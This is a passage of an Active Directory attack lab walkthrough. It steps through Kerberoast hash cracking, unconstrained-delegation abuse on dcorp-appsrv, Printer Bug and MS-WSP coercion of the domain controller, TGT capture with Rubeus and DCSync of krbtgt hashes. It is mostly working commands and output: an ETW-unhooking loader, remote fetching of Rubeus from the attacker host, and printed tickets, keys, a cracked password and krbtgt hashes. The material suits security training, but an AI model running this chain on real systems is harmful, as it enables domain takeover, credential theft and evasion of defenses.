4F1F77016DB94E03F4B5B2595E22B72D3520B1147A04C3D8DE86C60600A5BB1ED6CC1F07A57FA2D3B6ECA70DB7FE010FCFADCF617AADEC53D9E0B299992EACB463FBE89FC6BA4AFDE1207FE8ACE585B87CC30666F78377854095385DDD835506ADE8AD5FA28E5E1E5F49260275A9ECC7E66FDA69921EDA0E469A5C841EA8A842DA1FE52A92683DAEBB9933725846193784E156D5D6C15FF29FA72206F2198748D63F67AFDD5CA99BB68AFDA93F9C4879CB74F3FC24C3D3879E4A44CC1864A2F32CF99F556E7683FF80205B7B95BA2175E2CF1C3CC2A8B84619EE7A66B5123CF89BCB963BCAB6442ECD13331912495539CC735C88185144D5042C71F341BADAE70E6E8A162FB96F02259EF3859A57D70DDBAE126CE84A64A9423702216534DFFA8FDD825E8FEF0A73B23AF9761ABB7491413836A36C23F037CCE544505D01D17BF8F7BD1253BBF2405D7D6C512F1434E2E1ABC386B518FD400341DF6A17CA176ED9E50A69AD29DA276D20FD082DD7C9AEDDA8851F38349B80CEB1FF4F274F1E30216FAA1DE0149931570A3A24BB3FCFB7817
```

### We can now use John the Ripper to brute-force the hashes. Please note that you need to remove ":1433" from the SPN in hashes.txt before running John

```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*$C18A29F02C25C2DDCF25F809804D86B7$4A94FA3E6D84B69D18721F2E8908AB08CFFC1E7A2D6DE488752123E9E5957A13B47308CCE53D7796F0C1138CC320C2CBE1FE9C4F431EC5FAB35DC42F8DE1C180B8BFA990D7857BCA1445D216368037DD4047D60D26837FDCA597A21A57898F06D24730FB9B47C5EFF27F723A32CD66EA3523D2CF89148843E4EB4D10FF968C9198129A36E85C0E0F79CBDC3CA80E788A68B204F0076F61AF2C14F79EE0E68AC609BCF3079BE4FF489B69860D45C753299BE5F457AC2FCFB88C3F2E4BB2F3A280CF705CAA85645BB3DCE08068B31A0440B5D242B7453579FD9DBC0AF735F14541E489111CC4202B6AD80B54D9B4B9EEA9FEC87D9FC6ABAF8976CFF5FF58F7B2847105FF3DB29DBA39E18A1384BEBB11488E5D2E60696BB787099A6426933198C4DAD238C3C9912D2E463139114706D1A53F6085FE19D7AA5D824CB1A1DC4E6FADB755285C32A1AD4D8108F97FD013DC17997BA746A2A5393B400BA1AA817B013C36BF4253FE8D8C0E6F23A365A3F2EAD80FCBC6A20AB6390C22DA16651778D8E21734E65698C5B248AB1D131C72F54B4446D298AA2AF36A74AAFB06DA038AE3FAA0A7841D5546E2E0F9D817D5E8A79D1AECDA8D404F992686BDA059B6D051E62AF1840756F30A381DEF52976204179EC4E35EB2919B533D72230F5D32AE0B104224EE2786F3F576A5210F8BE4B06A0A38468466A525292216949A443044EB66F63955120445CD32E0B3339F1CB3199D2A0B026BD8CD1627F1E758EEEFD8EEC80CC6204766DF21CC610503AE5E10996597C46F5C332B83CB8B840095ECCAAEE5DDB31E1D39ACEB9E0DED769855E64F94AC5A07C5B4F47B4DFB7EC188CD6FF3896D224E67D350E06225A088D6826CA286E869CDE016EE80967BF6F157A3B1B9CDB69DA15EA9BEE054166CAE02D8EF734E51460BBE209B6E6EB011EED29BCC3458F7E8DDF368B08B2605A2D6F38A47777447E395053CB2FAF9C01EA038E219BB8AE78B7FEC8D3EE427AEF05BA4B159C89E306D8FDA53EB82233461A16816A40AD1444EB54E800051C40FA261CC24E84792C7BE0DB962CD5FAB22750C9AF273734439824F50D7FFD72FF5A82C22F4F1F77016DB94E03F4B5B2595E22B72D3520B1147A04C3D8DE86C60600A5BB1ED6CC1F07A57FA2D3B6ECA70DB7FE010FCFADCF617AADEC53D9E0B299992EACB463FBE89FC6BA4AFDE1207FE8ACE585B87CC30666F78377854095385DDD835506ADE8AD5FA28E5E1E5F49260275A9ECC7E66FDA69921EDA0E469A5C841EA8A842DA1FE52A92683DAEBB9933725846193784E156D5D6C15FF29FA72206F2198748D63F67AFDD5CA99BB68AFDA93F9C4879CB74F3FC24C3D3879E4A44CC1864A2F32CF99F556E7683FF80205B7B95BA2175E2CF1C3CC2A8B84619EE7A66B5123CF89BCB963BCAB6442ECD13331912495539CC735C88185144D5042C71F341BADAE70E6E8A162FB96F02259EF3859A57D70DDBAE126CE84A64A9423702216534DFFA8FDD825E8FEF0A73B23AF9761ABB7491413836A36C23F037CCE544505D01D17BF8F7BD1253BBF2405D7D6C512F1434E2E1ABC386B518FD400341DF6A17CA176ED9E50A69AD29DA276D20FD082DD7C9AEDDA8851F38349B80CEB1FF4F274F1E30216FAA1DE0149931570A3A24BB3FCFB7817
```

* C:\AD\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!! (?)
1g 0:00:00:00 DONE (2025-09-28 08:58) 27.02g/s 55351p/s 55351c/s 55351C/s energy..mollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Learning Objective 15:
```
• Find a server in the dcorp domain where Unconstrained Delegation is enabled. 
• Compromise the server and escalate to Domain Admin privileges. 
• Escalate to Enterprise Admins privileges by abusing Printer Bug!
```

### First, we need to find a server that has unconstrained delegation enabled

* C:\AD\Tools> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
* PS C:\AD\Tools> . C:\AD\Tools\PowerView.ps1
* PS C:\AD\Tools> Get-DomainComputer -Unconstrained | select -ExpandProperty name

```
DCORP-DC
DCORP-APPSRV
```

Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. 
Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let’s check if anyone of them have local admin privileges on dcorp-appsrv.

### First, we will try with appadmin. Run the below command from an elevated command prompt

* C:\Windows\System32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
[*] Action: Ask TGT

[*] Got domain: dollarcorp.moneycorp.local
[*] Showing process : True
[*] Username        : SP5SI1I0
[*] Domain          : N395QGVS
[*] Password        : FHF8B5ZT
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1508
[+] LUID            : 0xac119c

[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[!] Pre-Authentication required!
[!]     AES256 Salt: DOLLARCORP.MONEYCORP.LOCALappadmin
[*] Using aes256_cts_hmac_sha1 hash: 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\appadmin'
[*] Target LUID : 11276700
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[*] Target LUID: 0xac119c
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/DOLLARCORP.MONEYCORP.LOCAL
  ServiceRealm             :  DOLLARCORP.MONEYCORP.LOCAL
  UserName                 :  appadmin (NT_PRINCIPAL)
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  9/28/2025 9:29:33 AM
  EndTime                  :  9/28/2025 7:29:33 PM
  RenewTill                :  10/5/2025 9:29:33 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  N6hGzSy9QX1I/2T9A8gG3ax6TbV8iMq480g/euJ3OT0=
  ASREP (key)              :  68F08715061E4D0790E71B1245BF20B023D08822D2DF85BFF50A0E8136FFE4CB
```

### In the new proccess run

* C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
* PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
* PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local

```
dcorp-appsrv
dcorp-adminsrv
```

### We now have admin access to the machine that has unconstrained delegation

### Run the below command from the process running appadmin

* C:\Windows\system32> echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```
Does \\dcorp-appsrv\C$\Users\Public\Loader.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\Loader.exe
1 File(s) copied
```

* C:\Windows\system32> winrs -r:dcorp-appsrv cmd
* C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.31
* C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
* C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://172.16.100.31/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : http://172.16.100.31/Rubeus.exe Arguments : monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
[*] Action: TGT Monitoring
[*] Target user     : DCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

### Use the Printer Bug for Coercion
On the student VM, use MS-RPRN to force authentication from dcorp-dc$ (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required).

* C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

### On the Rubeus listener, we can see the TGT of dcorp-dc$

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : http://172.16.100.31/Rubeus.exe Arguments : monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
[*] Action: TGT Monitoring
[*] Target user     : DCORP-DC$
[*] Monitoring every 5 seconds for new TGTs


[*] 9/28/2025 4:44:44 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  9/28/2025 5:02:58 AM
  EndTime               :  9/28/2025 3:01:48 PM
  RenewTill             :  10/5/2025 5:01:48 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```

Copy the base64 encoded ticket and use it with Rubeus on student VM. 
Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process.

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhgg...

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\Rubeus.exe Arguments : ptt /ticket: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

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

### Now, we can run DCSync from this process

* C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\Tools\SafetyKatz.exe Arguments : lsadump::evasive-dcsync /user:dcorp\krbtgt exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd


mimikatz(commandline) # exit
Bye!
```

### Use the Windows Search Protocol (MS-WSP) for Coercion

We can also use Windows Search Protocol for abusing unconstrained delegation. Please note that the 
Windows Search Service is enabled by default on client machines but not on servers. For the lab, we 
have configured it on the domain controller (Traffic on TCP port 445 from student VM to dcorp-dc and 
dcorp-dc to dcorp-appsrv required). 

Setup Rubeus in monitor mode exactly as we did for the Printer Bug. On the student VM, use the 
following command to force dcorp-dc to connect to dcorp-appsrv

* C:\Users\student731>C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```
[+] Successfully unhooked ETW!
[+++] NTDLL.DLL IS UNHOOKED!
[+++] KERNEL32.DLL IS UNHOOKED!
[+++] KERNELBASE.DLL IS UNHOOKED!
[+++] ADVAPI32.DLL IS UNHOOKED!
[+] URL/PATH : C:\AD\tools\WSPCoerce.exe Arguments : DCORP-DC DCORP-APPSRV
[+] OleDbException - Error 0x80040718L
[+] Search query successfully sent to the target
```

### Use the Distributed File System Protocol (MS-DFSNM) for Coercion
If the target has DFS Namespaces service running, we can use that too for coercion (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required).

